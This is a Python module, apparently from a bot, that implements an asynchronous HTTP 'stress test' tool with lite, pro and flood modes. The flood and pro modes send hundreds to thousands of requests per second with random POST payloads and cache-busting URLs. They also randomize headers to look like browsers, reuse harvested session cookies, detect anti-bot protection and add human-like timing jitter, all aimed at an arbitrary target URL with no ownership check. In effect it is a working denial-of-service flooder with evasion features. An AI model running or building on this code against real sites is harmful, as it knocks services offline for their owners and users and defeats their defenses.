import asyncio
import random
import time
from dataclasses import dataclass, field
from urllib.parse import urlparse
import aiohttp

from bot.utils.protection_bypass import (
    get_random_headers,
    detect_protection,
    human_jitter,
)


@dataclass
class StressProfile:
    target_url: str
    duration: int = 60
    concurrency: int = 50
    max_rps: int = 100
    mode: str = "lite"          # lite | pro | flood
    methods: list = field(default_factory=lambda: ["GET"])
    timeout: float = 5.0


@dataclass
class TrafficResult:
    total_requests: int = 0
    success: int = 0
    failed: int = 0
    latencies: list = field(default_factory=list)
    status_codes: dict = field(default_factory=dict)
    rps_timeline: list = field(default_factory=list)
    protection_info: dict = field(default_factory=dict)
    elapsed: float = 0.0
    session_cookies_used: int = 0

    @property
    def rps(self) -> float:
        return round(self.total_requests / self.elapsed, 2) if self.elapsed > 0 else 0

    @property
    def success_rate(self) -> float:
        return round(self.success / self.total_requests * 100, 1) if self.total_requests else 0

    @property
    def p95(self) -> float:
        if not self.latencies:
            return 0
        s = sorted(self.latencies)
        return round(s[int(len(s) * 0.95)], 2)

    @property
    def p99(self) -> float:
        if not self.latencies:
            return 0
        s = sorted(self.latencies)
        return round(s[min(int(len(s) * 0.99), len(s) - 1)], 2)

    @property
    def avg_latency(self) -> float:
        return round(sum(self.latencies) / len(self.latencies), 2) if self.latencies else 0


def _bust_url(url: str) -> str:
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}_={random.randint(1_000_000, 9_999_999)}"


def _random_payload() -> bytes:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    length = random.randint(64, 512)
    return "".join(random.choices(chars, k=length)).encode()


class TrafficWorker:
    def __init__(self, profile: StressProfile):
        self.profile = profile
        self._result = TrafficResult()
        self._stop_event = asyncio.Event()
        self._cookie_pool: list[dict] = []
        self._lock = asyncio.Lock()

    async def _single_request(self, session: aiohttp.ClientSession, protection_checked: list):
        url = _bust_url(self.profile.target_url)
        method = random.choice(self.profile.methods)
        headers = get_random_headers()

        cookies = None
        if self.profile.mode in ("pro", "flood") and self._cookie_pool:
            async with self._lock:
                cookies = random.choice(self._cookie_pool)

        data = None
        if method == "POST":
            data = _random_payload()
            headers["Content-Type"] = "application/x-www-form-urlencoded"

        t0 = time.monotonic()
        try:
            kwargs: dict = dict(
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.profile.timeout),
                allow_redirects=True,
                ssl=False,
            )
            if cookies:
                kwargs["cookies"] = cookies
            if data:
                kwargs["data"] = data

            async with session.request(method, url, **kwargs) as resp:
                elapsed_ms = (time.monotonic() - t0) * 1000
                ok = resp.status < 500

                async with self._lock:
                    self._result.total_requests += 1
                    self._result.latencies.append(elapsed_ms)
                    key = str(resp.status)
                    self._result.status_codes[key] = self._result.status_codes.get(key, 0) + 1
                    if ok:
                        self._result.success += 1
                    else:
                        self._result.failed += 1

                    if not protection_checked and self.profile.mode in ("pro", "flood"):
                        info = detect_protection(dict(resp.headers))
                        if info.get("detected"):
                            self._result.protection_info = info
                        protection_checked.append(True)

                    if resp.cookies:
                        cookie_dict = {k: v.value for k, v in resp.cookies.items()}
                        if cookie_dict and cookie_dict not in self._cookie_pool:
                            self._cookie_pool.append(cookie_dict)
                            if len(self._cookie_pool) > 30:
                                self._cookie_pool.pop(0)
                            self._result.session_cookies_used += 1

        except Exception:
            elapsed_ms = (time.monotonic() - t0) * 1000
            async with self._lock:
                self._result.total_requests += 1
                self._result.failed += 1
                self._result.latencies.append(elapsed_ms)
                err_key = "0"
                self._result.status_codes[err_key] = self._result.status_codes.get(err_key, 0) + 1

    async def _rps_sampler(self):
        prev = 0
        while not self._stop_event.is_set():
            await asyncio.sleep(1)
            cur = self._result.total_requests
            self._result.rps_timeline.append(cur - prev)
            prev = cur

    async def run(self) -> TrafficResult:
        p = self.profile
        connector = aiohttp.TCPConnector(
            limit=p.concurrency,
            ssl=False,
            ttl_dns_cache=300,
            force_close=(p.mode == "flood"),
        )
        protection_checked: list = []
        start = time.monotonic()
        sampler = asyncio.create_task(self._rps_sampler())

        async with aiohttp.ClientSession(connector=connector) as session:
            pending: set[asyncio.Task] = set()
            try:
                while time.monotonic() - start < p.duration:
                    if self._stop_event.is_set():
                        break

                    # Flood mode: max concurrency, no delay
                    if p.mode == "flood":
                        batch = min(p.concurrency, p.max_rps // 10 + 1)
                        for _ in range(batch):
                            t = asyncio.create_task(self._single_request(session, protection_checked))
                            pending.add(t)
                            t.add_done_callback(pending.discard)
                        # tiny sleep to avoid blocking event loop
                        await asyncio.sleep(0.05)
                    elif p.mode == "pro":
                        t = asyncio.create_task(self._single_request(session, protection_checked))
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                        await human_jitter(5, 50)
                    else:
                        # Lite: fixed interval
                        interval = 1.0 / p.max_rps if p.max_rps > 0 else 0.01
                        t = asyncio.create_task(self._single_request(session, protection_checked))
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                        await asyncio.sleep(interval)

                if pending:
                    await asyncio.gather(*pending, return_exceptions=True)
            finally:
                self._stop_event.set()
                sampler.cancel()
                try:
                    await sampler
                except asyncio.CancelledError:
                    pass

        self._result.elapsed = time.monotonic() - start
        return self._result


async def run_load_test(profile: StressProfile) -> TrafficResult:
    worker = TrafficWorker(profile)
    return await worker.run()


def build_stress_profile(
    target_url: str,
    mode: str = "lite",
    duration: int = 60,
    concurrency: int = 50,
    intensity: str = "medium",
) -> StressProfile:

    if mode == "lite":
        return StressProfile(
            target_url=target_url,
            duration=min(duration, 60),
            concurrency=20,
            max_rps=100,
            mode="lite",
            methods=["GET"],
            timeout=8.0,
        )

    if mode == "flood":
        rps_map = {"low": 300, "medium": 700, "high": 1500, "ultra": 3000}
        conc_map = {"low": 100, "medium": 250, "high": 500, "ultra": 800}
        return StressProfile(
            target_url=target_url,
            duration=min(duration, 300),
            concurrency=conc_map.get(intensity, 250),
            max_rps=rps_map.get(intensity, 700),
            mode="flood",
            methods=["GET", "POST", "HEAD"],
            timeout=3.0,
        )

    # PRO
    rps_map = {"low": 200, "medium": 500, "high": 1000, "ultra": 2000}
    conc_map = {"low": 50,  "medium": 150, "high": 300,  "ultra": 500}
    return StressProfile(
        target_url=target_url,
        duration=duration,
        concurrency=conc_map.get(intensity, 150),
        max_rps=rps_map.get(intensity, 500),
        mode="pro",
        methods=["GET", "POST", "HEAD"],
        timeout=5.0,
    )
